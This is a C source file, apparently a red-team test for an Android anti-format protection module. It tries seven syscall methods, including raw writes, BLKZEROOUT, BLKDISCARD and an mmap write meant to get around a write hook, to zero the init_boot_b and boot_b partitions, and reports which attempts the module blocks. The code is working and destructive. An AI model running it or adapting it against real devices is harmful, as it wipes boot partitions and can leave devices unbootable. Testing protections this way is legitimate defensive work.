/*
 * attack_b.c
 * AntiFormat 红队验证样本（B 分区版）：多种 syscall 方案对 init_boot_b + boot_b 攻击
 *
 * 编译（静态，Android 直接可跑）：
 *   aarch64-linux-gnu-gcc -static -O2 -o attack_b attack_b.c
 *
 * 用法：
 *   ./attack_b                     # 默认攻击 init_boot_b + boot_b 的全部别名路径
 *   ./attack_b --initboot          # 只打 init_boot_b
 *   ./attack_b --boot              # 只打 boot_b
 *   ./attack_b /dev/block/sdXX     # 指定目标
 *
 * 输出约定：
 *   [BLOCKED] errno=EPERM          -> 被 AntiFormat 模块拦截（防护生效）
 *   [WRITE OK]                     -> 写入了！模块没拦住（漏洞/绕过）
 *   [FAIL] errno=...               -> 其他失败（权限/路径不存在/设备不支持）
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/fs.h>
#include <linux/falloc.h>

/* ---------------- 配置 ---------------- */
static size_t   g_chunk = 4096;        /* 单次写入字节数（默认 1 page） */
static int      g_total = 0, g_blocked = 0, g_ok = 0, g_fail = 0;

/* B 分区目标路径变体（dev_t 相同的不同访问路径，测模块是否按 dev_t 匹配） */
static const char *g_paths_initboot[] = {
    "/dev/block/by-name/init_boot_b",
    "/dev/block/bootdevice/by-name/init_boot_b",
    "/dev/block/sde64",   /* init_boot_b 真实节点 */
    NULL
};
static const char *g_paths_boot[] = {
    "/dev/block/by-name/boot_b",
    "/dev/block/bootdevice/by-name/boot_b",
    "/dev/block/sde47",   /* boot_b 真实节点 */
    NULL
};

static const char *errname(int e)
{
    switch (e) {
    case EPERM:  return "EPERM";
    case EACCES: return "EACCES";
    case ENOENT: return "ENOENT";
    case EINVAL: return "EINVAL";
    case EBUSY:  return "EBUSY";
    case ENXIO:  return "ENXIO";
    case EIO:    return "EIO";
    case ENODEV: return "ENODEV";
    case ENOTBLK:return "ENOTBLK";
    case EROFS:  return "EROFS";
    case EFAULT: return "EFAULT";
    default: {
        static char b[32];
        snprintf(b, sizeof(b), "errno=%d", e);
        return b;
    }
    }
}

/* ---------------- 底层动作 ---------------- */

/* 方案 A: open + write 整块写 */
static int try_write(const char *p)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) return -errno;
    char *buf = malloc(g_chunk);
    memset(buf, 0, g_chunk);
    ssize_t w = write(fd, buf, g_chunk);
    int rc = (w < 0) ? -errno : ((w == (ssize_t)g_chunk) ? 0 : -EIO);
    free(buf);
    close(fd);
    return rc;
}

/* 方案 B: open + pwrite64 多偏移写（模拟分散攻击） */
static int try_pwrite64(const char *p)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) return -errno;
    char *buf = malloc(g_chunk);
    memset(buf, 0, g_chunk);
    off_t offs[] = { 0, g_chunk, g_chunk*2, g_chunk*3, (1ULL<<20), (4ULL<<20) };
    int rc = 0;
    for (unsigned i = 0; i < sizeof(offs)/sizeof(offs[0]); i++) {
        ssize_t w = pwrite64(fd, buf, g_chunk, offs[i]);
        if (w < 0) { rc = -errno; break; }
        if ((size_t)w != g_chunk) { rc = -EIO; break; }
    }
    free(buf);
    close(fd);
    return rc;
}

/* 方案 C: open(O_RDONLY) + ioctl BLKZEROOUT 整块清零 */
static int try_blkzeroout(const char *p)
{
    int fd = open(p, O_RDONLY);
    if (fd < 0) return -errno;
    __u64 range[2];
    range[0] = 0;
    range[1] = g_chunk;
    int rc = ioctl(fd, BLKZEROOUT, &range);
    close(fd);
    return rc < 0 ? -errno : 0;
}

/* 方案 D: open(O_RDWR) + ioctl BLKDISCARD 丢弃（破坏性） */
static int try_blkdiscard(const char *p)
{
    int fd = open(p, O_RDWR);
    if (fd < 0) return -errno;
    __u64 range[2];
    range[0] = 0;
    range[1] = g_chunk;
    int rc = ioctl(fd, BLKDISCARD, &range);
    close(fd);
    return rc < 0 ? -errno : 0;
}

/* 方案 E: open(O_RDWR) + mmap(MAP_SHARED) + memset —— 绕过 write hook 的写映射 */
static int try_mmap(const char *p)
{
    int fd = open(p, O_RDWR);
    if (fd < 0) return -errno;
    size_t len = g_chunk;
    void *map = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        int e = errno;
        close(fd);
        return -e;
    }
    memset(map, 0, len);   /* 直接写映射，不走 write syscall */
    int rc = msync(map, len, MS_SYNC);   /* 刷盘，失败也算写失败 */
    if (rc < 0) rc = -errno;
    else rc = 0;
    munmap(map, len);
    close(fd);
    return rc;
}

/* 方案 F: open + fallocate(FALLOC_FL_ZERO_RANGE) 零范围预分配 */
static int try_fallocate(const char *p)
{
    int fd = open(p, O_RDWR);
    if (fd < 0) return -errno;
    int rc = fallocate(fd, FALLOC_FL_ZERO_RANGE, 0, g_chunk);
    close(fd);
    return rc < 0 ? -errno : 0;
}

/* 方案 G: open + ftruncate 截断（块设备一般 EINVAL，仍试） */
static int try_ftruncate(const char *p)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) return -errno;
    int rc = ftruncate(fd, g_chunk);
    close(fd);
    return rc < 0 ? -errno : 0;
}

/* ---------------- 方案注册表 ---------------- */
struct attack {
    const char *name;
    int (*fn)(const char *);
};
static const struct attack g_attacks[] = {
    { "write(fd,zero,4K)",          try_write      },
    { "pwrite64 多偏移",             try_pwrite64  },
    { "ioctl(BLKZEROOUT)",          try_blkzeroout },
    { "ioctl(BLKDISCARD)",          try_blkdiscard },
    { "mmap(MAP_SHARED)+memset",    try_mmap      },
    { "fallocate(ZERO_RANGE)",      try_fallocate },
    { "ftruncate",                  try_ftruncate  },
};

static void run_one(const char *path, const char *aname,
                    int (*fn)(const char *))
{
    errno = 0;
    int rc = fn(path);
    g_total++;
    if (rc == 0) {
        g_ok++;
        printf("  [WRITE OK] %-24s 目标=%-45s  <<< 模块未拦截！\n", aname, path);
    } else if (rc == -EPERM) {
        g_blocked++;
        printf("  [BLOCKED ] %-24s 目标=%-45s errno=EPERM (模块拦截 ✓)\n", aname, path);
    } else {
        g_fail++;
        printf("  [FAIL    ] %-24s 目标=%-45s errno=%s\n", aname, path, errname(-rc));
    }
}

static void run_targets(const char *label, const char **paths)
{
    printf("◆ 目标组: %s\n", label);
    for (const char **pp = paths; *pp; pp++) {
        printf("  路径: %s\n", *pp);
        for (unsigned a = 0; a < sizeof(g_attacks)/sizeof(g_attacks[0]); a++) {
            run_one(*pp, g_attacks[a].name, g_attacks[a].fn);
        }
    }
    printf("\n");
}

int main(int argc, char **argv)
{
    const char *custom = NULL;
    int do_initboot = 0, do_boot = 0;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--initboot"))      do_initboot = 1;
        else if (!strcmp(argv[i], "--boot"))     do_boot = 1;
        else if (argv[i][0] != '-')              custom = argv[i];
        else { fprintf(stderr, "未知参数: %s\n", argv[i]); return 2; }
    }

    printf("=== AntiFormat 红队验证: zero 攻击 B 分区 (init_boot_b + boot_b) ===\n");
    printf("单次写入=%zuB\n\n", g_chunk);

    if (custom) {
        const char *one[2] = { custom, NULL };
        run_targets("自定义", one);
    } else {
        if (do_initboot) run_targets("init_boot_b", g_paths_initboot);
        if (do_boot)     run_targets("boot_b",     g_paths_boot);
        if (!do_initboot && !do_boot) {
            run_targets("init_boot_b", g_paths_initboot);
            run_targets("boot_b",     g_paths_boot);
        }
    }

    printf("=== 汇总: 总尝试=%d 拦截(EPERM)=%d 成功写入=%d 其他失败=%d ===\n",
           g_total, g_blocked, g_ok, g_fail);
    printf("结论: %s\n", (g_ok == 0 && g_blocked > 0) ?
           "全部被模块拦截 ✓" :
           (g_ok > 0 ? "存在绕过路径 ✗ 需要补漏!" : "无成功也无EPERM(可能路径不可用)"));
    return 0;
}